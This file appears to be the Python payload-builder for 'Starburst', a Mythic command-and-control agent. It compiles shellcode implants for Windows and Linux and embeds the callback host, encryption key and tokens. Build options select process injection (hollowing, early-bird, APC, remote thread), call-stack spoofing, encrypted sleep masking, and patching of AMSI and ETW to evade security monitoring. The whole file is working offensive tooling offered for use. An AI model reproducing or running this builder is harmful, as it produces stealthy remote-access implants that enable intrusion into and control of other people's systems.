import pathlib
import os
import struct
import shutil
import tempfile
import subprocess
import zipfile
import logging

from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *

logger = logging.getLogger("starburst.builder")


class Starburst(PayloadType):
    name = "starburst"
    file_extension = "bin"
    author = "@Lavender-exe"
    semver = "1.0.0"
    supported_os = [ SupportedOS.Windows, SupportedOS.Linux ]
    wrapper = False
    wrapped_payloads = ["erebus_wrapper", "service_wrapper", "scarecrow_wrapper"]
    note = "PIC shellcode agent based on Stardust framework and Crystal Palace."
    supports_dynamic_loading = True
    c2_profiles = ["http", "httpx", "github", "smb", "tcp"]
    mythic_encrypts = True
    translation_container = "StarburstTranslator"

    agent_path = pathlib.Path(__file__).resolve().parent.parent
    agent_icon_path = agent_path / "assets" / "Starburst.png"
    agent_code_path = agent_path / "agent_code"

    build_parameters = [
        BuildParameter(
            name="output_type",
            group_name="Main",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["bin", "shellcode", "exe", "dll", "service_exe"],
            default_value="bin",
            description="Output format: raw PIC, Crystal Palace shellcode, EXE, DLL, or Windows service EXE",
        ),
        BuildParameter(
            name="architecture",
            group_name="Main",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["x64", "x86"],
            default_value="x64",
            description="Target architecture",
        ),
        BuildParameter(
            name="debug",
            group_name="Main",
            parameter_type=BuildParameterType.Boolean,
            default_value=False,
            description="Include debug output",
        ),
        BuildParameter(
            name="custom_udrl",
            group_name="UDRL",
            parameter_type=BuildParameterType.Boolean,
            default_value=False,
            description="Use custom Crystal Palace UDRL instead of default loader",
            hide_conditions=[
                HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="bin"),
            ],
        ),
        BuildParameter(
            name="udrl_file",
            group_name="UDRL",
            parameter_type=BuildParameterType.File,
            description="Custom Crystal Palace UDRL: ZIP with Makefile + loader.spec + src/",
            required=False,
            hide_conditions=[
                HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="bin"),
                HideCondition(name="custom_udrl", operand=HideConditionOperand.EQ, value=False),
            ],
        ),
        BuildParameter(
            name="custom_postex_udrl",
            group_name="UDRL",
            parameter_type=BuildParameterType.Boolean,
            default_value=False,
            description="Use custom Crystal Palace UDRL for post-ex operations",
            hide_conditions=[
                HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="bin"),
            ],
        ),
        BuildParameter(
            name="postex_udrl_file",
            group_name="UDRL",
            parameter_type=BuildParameterType.File,
            description="Custom post-ex UDRL: ZIP with Makefile + loader.spec + src/",
            required=False,
            hide_conditions=[
                HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="bin"),
                HideCondition(name="custom_postex_udrl", operand=HideConditionOperand.EQ, value=False),
            ],
        ),
        BuildParameter(
            name="alloc_method",
            group_name="Injection",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["VirtualAlloc", "NtAllocateVirtualMemory", "MapViewOfSection"],
            default_value="VirtualAlloc",
            description="Memory allocation method for loader (non-bin output only)",
            hide_conditions=[
                HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="bin"),
                HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="shellcode"),
            ],
        ),
        BuildParameter(
            name="exec_method",
            group_name="Injection",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["direct", "CreateThread", "callback", "fiber", "threadpool"],
            default_value="direct",
            description="Local execution method for loader",
            hide_conditions=[
                HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="bin"),
                HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="shellcode"),
                HideCondition(name="injection_mode", operand=HideConditionOperand.NotEQ, value="local"),
            ],
        ),
        BuildParameter(
            name="injection_mode",
            group_name="Injection",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["local", "remote", "hollow", "earlybird"],
            default_value="local",
            description="Injection mode: local exec or remote process injection",
            hide_conditions=[
                HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="bin"),
                HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="shellcode"),
            ],
        ),
        BuildParameter(
            name="injection_target",
            group_name="Injection",
            parameter_type=BuildParameterType.String,
            default_value="C:\\\\Windows\\\\System32\\\\svchost.exe",
            description="Target process for remote injection",
            hide_conditions=[
                HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="bin"),
                HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="shellcode"),
                HideCondition(name="injection_mode", operand=HideConditionOperand.EQ, value="local"),
            ],
        ),
        BuildParameter(
            name="spoof_profile",
            group_name="Evasion",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["off", "thread", "worker", "custom"],
            default_value="thread",
            description="Call stack spoof profile: thread, worker, custom, or off",
            hide_conditions = [
                HideCondition(name="architecture", operand=HideConditionOperand.EQ, value="x86"),
            ]
        ),
        BuildParameter(
            name="injection_technique",
            group_name="Injection",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["crt", "apc", "section", "custom"],
            default_value="crt",
            description="Remote injection technique for shinject/migrate: CreateRemoteThread, APC Early Bird, NtCreateSection, or custom",
        ),
        BuildParameter(
            name="sleep_mask",
            group_name="Evasion",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["default", "full_image", "heap", "ekko", "custom"],
            default_value="default",
            description="Sleep mask type: XOR sensitive fields, full image XOR, heap masking, Ekko timer-queue ROP (x64, encrypts image during sleep), or custom",
        ),
        BuildParameter(
            name="patch_amsi",
            group_name="Evasion",
            parameter_type=BuildParameterType.Boolean,
            default_value=True,
            description="Patch AMSI via hardware breakpoint before CLR operations (execute_assembly, powerpick). No code bytes modified.",
        ),
        BuildParameter(
            name="patch_etw",
            group_name="Evasion",
            parameter_type=BuildParameterType.Boolean,
            default_value=True,
            description="Patch ntdll!EtwEventWrite at agent init to suppress CLR ETW telemetry (assembly loads, JIT events).",
        ),
    ]

    build_steps = [
        BuildStep(step_name="Gathering", step_description="Copying agent source"),
        BuildStep(step_name="Configuring", step_description="Stamping config into agent"),
        BuildStep(step_name="Compiling", step_description="Building PIC shellcode"),
        BuildStep(step_name="Wrapping", step_description="Producing final artifact"),
    ]

    async def build(self) -> BuildResponse:
        resp = BuildResponse(status=BuildStatus.Success)

        try:
            target_os = self.selected_os
            if target_os.lower() == "linux":
                return await self._build_linux()

            agent_build_path = tempfile.mkdtemp()
            arch = self.get_parameter("architecture")
            output_type = self.get_parameter("output_type")
            debug = self.get_parameter("debug")

            # Step 1: Copy agent source
            src_path = str(self.agent_code_path)
            dst_path = os.path.join(agent_build_path, "agent_code")
            shutil.copytree(src_path, dst_path)

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Gathering",
                StepStdout="Copied agent source to build directory",
                StepSuccess=True,
            ))

            # Step 2: Build config
            c2_profile_name = ""
            c2_params = {}
            for c2 in self.c2info:
                c2_profile_name = c2.get_c2profile()["name"]
                c2_params = c2.get_parameters_dict()
                break

            transport_define = ""
            if c2_profile_name == "http":
                transport_define = "#define HTTP_TRANSPORT"
            elif c2_profile_name == "httpx":
                transport_define = "#define HTTPX_TRANSPORT"
            elif c2_profile_name == "github":
                transport_define = "#define GITHUB_TRANSPORT"
            elif c2_profile_name == "smb":
                transport_define = "#define SMB_TRANSPORT"
            elif c2_profile_name == "tcp":
                transport_define = "#define TCP_TRANSPORT"

            import logging
            logger = logging.getLogger("starburst.builder")
            logger.info(f"C2 profile: {c2_profile_name}")
            logger.info(f"C2 params keys: {list(c2_params.keys())}")
            aes_psk_param = c2_params.get("AESPSK", "NOT_FOUND")
            if isinstance(aes_psk_param, dict):
                logger.info(f"AESPSK type=dict, keys={list(aes_psk_param.keys())}, enc_key_present={'enc_key' in aes_psk_param}")
            else:
                logger.info(f"AESPSK type={type(aes_psk_param).__name__}, value={repr(aes_psk_param)[:100]}")

            config_bytes = self._serialize_config(c2_profile_name, c2_params)
            config_hex = ", ".join(f"0x{b:02x}" for b in config_bytes)

            commands = self.commands.get_commands()
            cmd_defines = []
            for cmd in commands:
                cmd_defines.append(f"#define INCLUDE_CMD_{cmd.upper()}")
            cmd_defines_str = "\n".join(cmd_defines)

            # Stamp config.h
            config_h_path = os.path.join(dst_path, "include", "config.h")
            with open(config_h_path, "r") as f:
                config_content = f.read()

            config_content = config_content.replace("%TRANSPORT_DEFINE%", transport_define)
            config_content = config_content.replace("%CONFIG_BYTES%", config_hex)
            config_content = config_content.replace("%COMMAND_DEFINES%", cmd_defines_str)

            evasion_defines = self._build_evasion_defines()
            config_content = config_content.replace("%EVASION_DEFINES%", evasion_defines)

            with open(config_h_path, "w") as f:
                f.write(config_content)

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Configuring",
                StepStdout=f"Config stamped: {c2_profile_name} transport, {len(commands)} commands",
                StepSuccess=True,
            ))

            # Step 3: Compile
            make_target = arch
            if debug:
                make_target = f"{arch}-debug"

            os.makedirs(os.path.join(dst_path, "bin", "obj"), exist_ok=True)

            proc = subprocess.run(
                ["make", make_target],
                cwd=dst_path,
                capture_output=True,
                text=True,
                timeout=120,
            )

            if proc.returncode != 0:
                resp.status = BuildStatus.Error
                resp.build_stderr = proc.stderr
                resp.build_message = f"Compilation failed:\n{proc.stdout}\n{proc.stderr}"
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Compiling",
                    StepStdout=proc.stdout,
                    StepStderr=proc.stderr,
                    StepSuccess=False,
                ))
                return resp

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Compiling",
                StepStdout=proc.stdout,
                StepSuccess=True,
            ))

            # Step 4: Read shellcode and optionally wrap
            bin_path = os.path.join(dst_path, "bin", f"starburst.{arch}.bin")
            exe_path = os.path.join(dst_path, "bin", f"starburst.{arch}.exe")
            with open(bin_path, "rb") as f:
                shellcode = f.read()

            if output_type == "bin":
                resp.payload = shellcode
                resp.build_message = f"Starburst {arch} shellcode: {len(shellcode)} bytes"

            elif output_type == "shellcode":
                if os.path.exists(exe_path):
                    with open(exe_path, "rb") as f:
                        pe_bytes = f.read()
                    cp_result = await self._link_with_crystal_palace(
                        pe_bytes, arch, agent_build_path)
                else:
                    cp_result = None
                    logger.error(f"PE not found at {exe_path} for Crystal Palace linking")
                if cp_result is None:
                    resp.status = BuildStatus.Error
                    resp.build_message = "Crystal Palace linking failed"
                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Wrapping",
                        StepStdout="Crystal Palace linking failed",
                        StepSuccess=False,
                    ))
                    return resp
                resp.payload = cp_result
                resp.build_message = f"Starburst {arch} Crystal Palace shellcode: {len(cp_result)} bytes"

            else:
                if os.path.exists(exe_path):
                    with open(exe_path, "rb") as f:
                        pe_bytes = f.read()
                    linked_sc = await self._link_with_crystal_palace(
                        pe_bytes, arch, agent_build_path)
                else:
                    linked_sc = None
                    logger.warning(f"PE not found at {exe_path}, falling back to raw shellcode")
                if linked_sc is None:
                    logger.warning("CPL link failed for DLL/EXE, falling back to raw shellcode")
                    linked_sc = shellcode

                wrapped = self._wrap_shellcode(linked_sc, output_type, arch, dst_path)
                if wrapped is None:
                    resp.status = BuildStatus.Error
                    resp.build_message = "Failed to wrap shellcode in loader"
                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Wrapping",
                        StepStdout="Loader compilation failed",
                        StepSuccess=False,
                    ))
                    return resp
                resp.payload = wrapped
                resp.build_message = f"Starburst {arch} {output_type} (CPL linked): {len(wrapped)} bytes"

            # install custom post-ex UDRL if provided
            if self.get_parameter("custom_postex_udrl"):
                try:
                    await self._install_custom_postex(agent_build_path)
                except Exception as pe:
                    logger.warning(f"Custom post-ex UDRL install failed: {pe}")

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Wrapping",
                StepStdout=resp.build_message,
                StepSuccess=True,
            ))

        except Exception as e:
            resp.status = BuildStatus.Error
            resp.build_stderr = str(e)
            resp.build_message = f"Build error: {str(e)}"

        return resp

    def _serialize_config(self, c2_profile, c2_params):
        buf = b""

        uuid_bytes = self.uuid.encode("utf-8")[:36].ljust(36, b"\x00")
        buf += uuid_bytes

        import base64 as b64mod
        aes_key = b"\x00" * 32
        aes_psk = c2_params.get("AESPSK", {})
        if isinstance(aes_psk, dict) and aes_psk.get("enc_key"):
            aes_key = b64mod.b64decode(aes_psk["enc_key"])[:32].ljust(32, b"\x00")
        elif isinstance(aes_psk, str) and aes_psk not in ("", "none"):
            try:
                aes_key = b64mod.b64decode(aes_psk)[:32].ljust(32, b"\x00")
            except Exception:
                pass
        buf += aes_key

        # sleep (ms)
        interval = int(c2_params.get("callback_interval", 10)) * 1000
        buf += struct.pack(">I", interval)

        # jitter (percent)
        jitter = int(c2_params.get("callback_jitter", 23))
        buf += struct.pack(">I", jitter)

        # killdate (0 = none)
        buf += struct.pack(">I", 0)

        if c2_profile in ("http", "httpx"):
            host = c2_params.get("callback_host", "")
            if "://" in host:
                host = host.split("://", 1)[1]
            if host.endswith("/"):
                host = host[:-1]
            buf += self._pack_string(host)

            port = int(c2_params.get("callback_port", 80))
            buf += struct.pack(">I", port)

            use_ssl = 1 if "https" in c2_params.get("callback_host", "") else 0
            buf += struct.pack("B", use_ssl)

            buf += self._pack_string(c2_params.get("USER_AGENT", "Mozilla/5.0"))

            get_uri = c2_params.get("callback_uri", "index")
            post_uri = c2_params.get("post_uri", "data")
            buf += self._pack_string(get_uri)
            buf += self._pack_string(post_uri)

            query_param = c2_params.get("query_path_name", "q")
            buf += self._pack_string(query_param)

            proxy_host = c2_params.get("proxy_host", "")
            if proxy_host:
                buf += struct.pack("B", 1)
                buf += self._pack_string(proxy_host)
                buf += struct.pack(">I", int(c2_params.get("proxy_port", 8080)))
                buf += self._pack_string(c2_params.get("proxy_user", ""))
                buf += self._pack_string(c2_params.get("proxy_pass", ""))
            else:
                buf += struct.pack("B", 0)

            if c2_profile == "httpx":
                domain_front = c2_params.get("domain_front", "")
                buf += self._pack_string(domain_front)

                # build custom headers string from HTTPX profile headers list
                headers_list = c2_params.get("headers", {})
                header_lines = []
                if isinstance(headers_list, dict):
                    for k, v in headers_list.items():
                        header_lines.append(f"{k}: {v}")
                elif isinstance(headers_list, list):
                    for h in headers_list:
                        if isinstance(h, dict):
                            for k, v in h.items():
                                header_lines.append(f"{k}: {v}")
                        elif isinstance(h, str):
                            header_lines.append(h)
                custom_headers = "\r\n".join(header_lines)
                buf += self._pack_string(custom_headers)

        elif c2_profile == "github":
            buf += self._pack_string(c2_params.get("personal_access_token", ""))
            buf += self._pack_string(c2_params.get("github_owner", ""))
            buf += self._pack_string(c2_params.get("github_repo", ""))
            buf += struct.pack(">I", int(c2_params.get("server_issue", 1)))
            buf += struct.pack(">I", int(c2_params.get("client_issue", 2)))

        elif c2_profile == "smb":
            pipename = c2_params.get("pipename", "")
            buf += self._pack_string(pipename)

        elif c2_profile == "tcp":
            tcp_port = int(c2_params.get("port", None) or 7000)
            buf += struct.pack(">I", tcp_port)

        return buf

    def _pack_string(self, s):
        if isinstance(s, str):
            s = s.encode("utf-8")
        return struct.pack(">I", len(s)) + s

    def _wrap_shellcode(self, shellcode, output_type, arch, build_path):
        loaders_path = os.path.join(os.path.dirname(str(self.agent_code_path)), "..", "loaders")

        if output_type == "exe":
            loader_src = os.path.join(loaders_path, "exe_loader.c")
        elif output_type == "dll":
            loader_src = os.path.join(loaders_path, "dll_loader.c")
        elif output_type == "service_exe":
            loader_src = os.path.join(loaders_path, "svc_loader.c")
        else:
            return None

        if not os.path.exists(loader_src):
            return None

        # copy engine.h to build dir
        engine_src = os.path.join(loaders_path, "engine.h")
        if os.path.exists(engine_src):
            shutil.copy2(engine_src, os.path.join(build_path, "engine.h"))

        # build engine defines from build parameters
        engine_defines = self._build_engine_defines()

        sc_array = ", ".join(f"0x{b:02x}" for b in shellcode)
        sc_len = len(shellcode)

        with open(loader_src, "r", encoding="utf-8", errors="replace") as f:
            loader_code = f.read()

        loader_code = loader_code.replace("%ENGINE_DEFINES%", engine_defines)
        loader_code = loader_code.replace("%SHELLCODE_BYTES%", sc_array)
        loader_code = loader_code.replace("%SHELLCODE_LEN%", str(sc_len))

        # stamp injection target in engine.h copy
        injection_target = self.get_parameter("injection_target")
        engine_h_path = os.path.join(build_path, "engine.h")
        if os.path.exists(engine_h_path):
            with open(engine_h_path, "rb") as f:
                engine_content = f.read()
            escaped_target = injection_target.replace("\\", "\\\\")
            engine_content = engine_content.replace(
                b"%INJECT_TARGET%", f'"{escaped_target}"'.encode("utf-8")
            )
            with open(engine_h_path, "wb") as f:
                f.write(engine_content)

        stamped_path = os.path.join(build_path, "loader.c")
        with open(stamped_path, "w") as f:
            f.write(loader_code)

        if arch == "x64":
            cc = "x86_64-w64-mingw32-gcc"
        else:
            cc = "i686-w64-mingw32-gcc"

        ext = "dll" if output_type == "dll" else "exe"
        out_path = os.path.join(build_path, f"starburst.{ext}")

        cmd = [cc, stamped_path, "-o", out_path, "-s", "-Os", "-w",
               f"-I{build_path}", "-lkernel32", "-lntdll"]
        if output_type == "dll":
            cmd.append("-shared")
        elif output_type == "service_exe":
            cmd.append("-ladvapi32")
        if output_type in ("exe", "service_exe"):
            cmd.append("-mwindows")

        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        if proc.returncode != 0:
            return None

        with open(out_path, "rb") as f:
            return f.read()

    def _build_engine_defines(self):
        defines = []

        alloc = self.get_parameter("alloc_method")
        if alloc == "NtAllocateVirtualMemory":
            defines.append("#define ALLOC_NTALLOCATE")
        elif alloc == "MapViewOfSection":
            defines.append("#define ALLOC_MAPVIEW")
        else:
            defines.append("#define ALLOC_VIRTUALALLOC")

        injection = self.get_parameter("injection_mode")
        if injection == "remote":
            defines.append("#define INJECT_REMOTE")
        elif injection == "hollow":
            defines.append("#define INJECT_HOLLOW")
        elif injection == "earlybird":
            defines.append("#define INJECT_EARLYBIRD")
        else:
            exec_method = self.get_parameter("exec_method")
            if exec_method == "CreateThread":
                defines.append("#define EXEC_CREATETHREAD")
            elif exec_method == "callback":
                defines.append("#define EXEC_CALLBACK")
            elif exec_method == "fiber":
                defines.append("#define EXEC_FIBER")
            elif exec_method == "threadpool":
                defines.append("#define EXEC_THREADPOOL")
            else:
                defines.append("#define EXEC_DIRECT")

        return "\n".join(defines)

    def _build_evasion_defines(self):
        defines = []
        try:
            spoof = self.get_parameter("spoof_profile")
        except Exception:
            spoof = "thread"
        if spoof and spoof != "off":
            defines.append("#define INCLUDE_EVASION_SPOOF")
            if spoof == "worker":
                defines.append("#define SPOOF_PROFILE SPOOF_PROFILE_WORKER")
            elif spoof == "custom":
                defines.append("#define SPOOF_PROFILE SPOOF_PROFILE_CUSTOM")
            else:
                defines.append("#define SPOOF_PROFILE SPOOF_PROFILE_THREAD")

        try:
            inject = self.get_parameter("injection_technique")
        except Exception:
            inject = "crt"
        inject_map = {
            "crt": "INJECT_CRT",
            "apc": "INJECT_APC",
            "section": "INJECT_SECTION",
            "custom": "INJECT_CUSTOM",
        }
        defines.append(f"#define INJECTION_TECHNIQUE {inject_map.get(inject, 'INJECT_CRT')}")

        try:
            mask = self.get_parameter("sleep_mask")
        except Exception:
            mask = "default"
        mask_map = {
            "default": "MASK_DEFAULT",
            "full_image": "MASK_FULL_IMAGE",
            "heap": "MASK_HEAP",
            "ekko": "MASK_EKKO",
            "custom": "MASK_CUSTOM",
        }
        defines.append(f"#define SLEEP_MASK_TYPE {mask_map.get(mask, 'MASK_DEFAULT')}")

        try:
            patch_amsi = self.get_parameter("patch_amsi")
        except Exception:
            patch_amsi = True
        if patch_amsi:
            defines.append("#define INCLUDE_EVASION_AMSI")

        try:
            patch_etw = self.get_parameter("patch_etw")
        except Exception:
            patch_etw = True
        if patch_etw:
            defines.append("#define INCLUDE_EVASION_ETW")

        return "\n".join(defines)

    async def _link_with_crystal_palace(self, shellcode, arch, build_path):
        loaders_path = os.path.join(os.path.dirname(str(self.agent_code_path)), "..", "loaders")
        cp_path = os.path.join(loaders_path, "crystal-palace")
        crystal_linker = os.path.join(cp_path, "crystal-linker")

        jar_path = os.path.join(crystal_linker, "crystalpalace.jar")
        if not os.path.exists(jar_path):
            logger.error("Crystal Palace not installed - place crystalpalace.jar in loaders/crystal-palace/crystal-linker/")
            return None

        use_custom = self.get_parameter("custom_udrl")
        if use_custom:
            udrl_dir = os.path.join(build_path, "custom_udrl")
            os.makedirs(udrl_dir, exist_ok=True)

            udrl_file_id = self.get_parameter("udrl_file")
            udrl_resp = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
                AgentFileId=udrl_file_id,
            ))
            if not udrl_resp.Success:
                logger.error(f"Failed to fetch custom UDRL: {udrl_resp.Error}")
                return None

            import io
            zip_buf = io.BytesIO(udrl_resp.Content)
            with zipfile.ZipFile(zip_buf, 'r') as z:
                z.extractall(udrl_dir)

            make_proc = subprocess.run(
                ["make", arch],
                cwd=udrl_dir,
                capture_output=True, text=True, timeout=60)
            if make_proc.returncode != 0:
                logger.error(f"Custom UDRL compile failed: {make_proc.stderr}")
                return None

            loader_path = udrl_dir
        else:
            loader_path = os.path.join(cp_path, "default")

        sc_file = os.path.join(build_path, "starburst_sc.bin")
        out_file = os.path.join(build_path, f"out.{arch}.bin")

        with open(sc_file, "wb") as f:
            f.write(shellcode)

        spec_file = os.path.join(loader_path, "loader.spec")
        if not os.path.exists(spec_file):
            logger.error(f"loader.spec not found at {spec_file}")
            return None

        command = ["java", "-jar", jar_path, "link", spec_file, sc_file, out_file]
        logger.info(f"Crystal Palace link: {' '.join(command)}")

        proc = subprocess.run(
            command,
            cwd=crystal_linker,
            capture_output=True, text=True, timeout=120)

        if proc.stdout:
            logger.info(f"Crystal Palace stdout: {proc.stdout}")
        if proc.stderr:
            logger.info(f"Crystal Palace stderr: {proc.stderr}")

        if proc.returncode != 0:
            logger.error(f"Crystal Palace link failed (rc={proc.returncode}): {proc.stdout}\n{proc.stderr}")
            return None

        if not os.path.exists(out_file):
            logger.error(f"Crystal Palace produced no output at {out_file}")
            return None

        with open(out_file, "rb") as f:
            return f.read()

    async def _install_custom_postex(self, build_path):
        loaders_path = os.path.join(os.path.dirname(str(self.agent_code_path)), "..", "loaders")
        cp_path = os.path.join(loaders_path, "crystal-palace")

        postex_file_id = self.get_parameter("postex_udrl_file")
        if not postex_file_id:
            return

        postex_resp = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
            AgentFileId=postex_file_id,
        ))
        if not postex_resp.Success:
            raise RuntimeError(f"Failed to fetch post-ex UDRL: {postex_resp.Error}")

        custom_dir = os.path.join(cp_path, f"postex_{self.uuid}")
        os.makedirs(custom_dir, exist_ok=True)

        import io
        zip_buf = io.BytesIO(postex_resp.Content)
        with zipfile.ZipFile(zip_buf, 'r') as z:
            z.extractall(custom_dir)

        arch = self.get_parameter("architecture")
        make_proc = subprocess.run(
            ["make", arch],
            cwd=custom_dir,
            capture_output=True, text=True, timeout=60)
        if make_proc.returncode != 0:
            raise RuntimeError(f"Custom post-ex compile failed: {make_proc.stderr}")

        logger.info(f"Installed custom post-ex UDRL for payload {self.uuid}")

    async def _build_linux(self) -> BuildResponse:
        resp = BuildResponse(status=BuildStatus.Success)
        try:
            import base64 as b64mod
            debug = self.get_parameter("debug")

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Gathering",
                StepStdout="Preparing Linux agent source",
                StepSuccess=True,
            ))

            c2_profile_name = ""
            c2_params = {}
            for c2 in self.c2info:
                c2_profile_name = c2.get_c2profile()["name"]
                c2_params = c2.get_parameters_dict()
                break

            if c2_profile_name not in ("http", "httpx"):
                resp.status = BuildStatus.Error
                resp.build_message = f"Linux agent only supports HTTP/HTTPX C2, got: {c2_profile_name}"
                return resp

            host = c2_params.get("callback_host", "")
            if "://" in host:
                host = host.split("://", 1)[1]
            if host.endswith("/"):
                host = host[:-1]
            port = int(c2_params.get("callback_port", 443))
            post_uri = c2_params.get("post_uri", "agent_message")
            interval = int(c2_params.get("callback_interval", 10))

            aes_key_hex = "0" * 64
            aes_psk = c2_params.get("AESPSK", {})
            if isinstance(aes_psk, dict) and aes_psk.get("enc_key"):
                raw = b64mod.b64decode(aes_psk["enc_key"])[:32]
                aes_key_hex = raw.hex()
            elif isinstance(aes_psk, str) and aes_psk not in ("", "none"):
                try:
                    raw = b64mod.b64decode(aes_psk)[:32]
                    aes_key_hex = raw.hex()
                except Exception:
                    pass

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Configuring",
                StepStdout=f"Config: {c2_profile_name} -> {host}:{port}/{post_uri}, sleep={interval}s",
                StepSuccess=True,
            ))

            src_file = os.path.join(str(self.agent_code_path), "src", "linux", "starburst_linux.c")
            if not os.path.exists(src_file):
                resp.status = BuildStatus.Error
                resp.build_message = f"Linux source not found: {src_file}"
                return resp

            build_dir = tempfile.mkdtemp()
            shutil.copy2(src_file, os.path.join(build_dir, "starburst_linux.c"))

            defines = [
                f"-DCFG_PAYLOAD_UUID='\"{self.uuid}\"'",
                f"-DCFG_AES_KEY_HEX='\"{aes_key_hex}\"'",
                f"-DCFG_CALLBACK_HOST='\"{host}\"'",
                f"-DCFG_CALLBACK_PORT={port}",
                f"-DCFG_POST_URI='\"{post_uri}\"'",
                f"-DCFG_SLEEP_INTERVAL={interval}",
            ]
            if debug:
                defines.append("-DDEBUG_BUILD")

            out_path = os.path.join(build_dir, "starburst_linux")
            cmd = [
                "gcc", "-o", out_path, os.path.join(build_dir, "starburst_linux.c"),
                *defines,
                "-static", "-lssl", "-lcrypto", "-lpthread", "-ldl",
                "-O2", "-Wall",
                "-Wno-unused-result", "-Wno-format-truncation", "-Wno-stringop-truncation",
            ]
            if not debug:
                cmd.append("-s")

            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            if proc.returncode != 0:
                resp.status = BuildStatus.Error
                resp.build_stderr = proc.stderr
                resp.build_message = f"Linux compilation failed:\n{proc.stdout}\n{proc.stderr}"
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Compiling",
                    StepStdout=proc.stdout,
                    StepStderr=proc.stderr,
                    StepSuccess=False,
                ))
                return resp

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Compiling",
                StepStdout=f"gcc succeeded: {proc.stdout.strip()}" if proc.stdout.strip() else "gcc succeeded",
                StepSuccess=True,
            ))

            with open(out_path, "rb") as f:
                elf_bytes = f.read()

            resp.payload = elf_bytes
            resp.build_message = f"Starburst Linux ELF: {len(elf_bytes)} bytes"

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Wrapping",
                StepStdout=resp.build_message,
                StepSuccess=True,
            ))

        except Exception as e:
            resp.status = BuildStatus.Error
            resp.build_stderr = str(e)
            resp.build_message = f"Linux build error: {str(e)}"

        return resp
